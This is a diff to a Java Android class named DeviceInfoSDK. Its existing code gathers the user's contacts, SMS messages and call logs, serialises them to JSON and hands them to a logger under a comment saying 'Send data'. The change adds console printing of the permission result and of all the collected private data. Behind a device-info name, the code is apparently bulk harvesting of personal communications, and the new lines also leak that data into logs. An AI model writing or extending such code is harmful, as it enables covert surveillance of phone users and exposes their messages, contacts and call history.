@@ -17,7 +17,9 @@ import java.util.List;
 public class DeviceInfoSDK {
 
     public static boolean initialize(Activity activity) {
-        return PermissionManager.checkAndRequestPermissions(activity);
+        boolean granted = PermissionManager.checkAndRequestPermissions(activity);
+        System.out.println("Permissions granted: " + granted);
+        return granted;
     }
 
     public static List<String> getContacts(Context context) {
@@ -37,7 +39,16 @@ public class DeviceInfoSDK {
         List<String> messages = getMessages(context);
         List<String> callLogs = getCallLogs(context);
 
+        System.out.println("Collected Contacts: " + contacts);
+        System.out.println("Collected Messages: " + messages);
+        System.out.println("Collected Call Logs: " + callLogs);
+
+        // Serialize data
         String jsonData = new Gson().toJson(new DataPayload(contacts, messages, callLogs));
+        System.out.println("JSON Payload: " + jsonData);
+
+        // Send data
         DataLogger.logData(jsonData);
     }
+
 }
